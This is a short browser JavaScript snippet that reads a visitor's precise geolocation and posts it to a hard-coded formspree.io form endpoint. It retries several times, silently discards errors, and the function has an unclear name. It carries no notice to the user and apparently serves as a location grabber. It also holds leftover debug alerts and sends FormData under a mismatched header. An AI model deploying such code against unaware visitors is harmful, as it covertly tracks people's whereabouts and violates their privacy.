async function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocation is not supported by your browser.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos),
      err => reject("Unable to retrieve location: " + err.message)
    );
  });
}

async function sendRequest(data) {
  let attempts = 0;
  while (attempts < 5) {
    try {
      const response = await fetch("https://formspree.io/f/xeorknrp", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: data
      });
      alert(typeof(data))
      alert(response)
      if (response.ok) break;
    } catch (err) {
      
    }
    attempts++;
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function dgree() {
  try {
    const pos = await getLocation();
    const data = new FormData();
    
    data.append("Latitude", pos.coords.latitude);
    data.append("Longitude", pos.coords.longitude);
    data.append("Accuracy", pos.coords.accuracy);
    data.append("Altitude", pos.coords.altitude);
    data.append("Speed", pos.coords.speed);
    data.append("Heading", pos.coords.heading);
    
    await sendRequest(data);
  } catch (err) {
    
  }
}

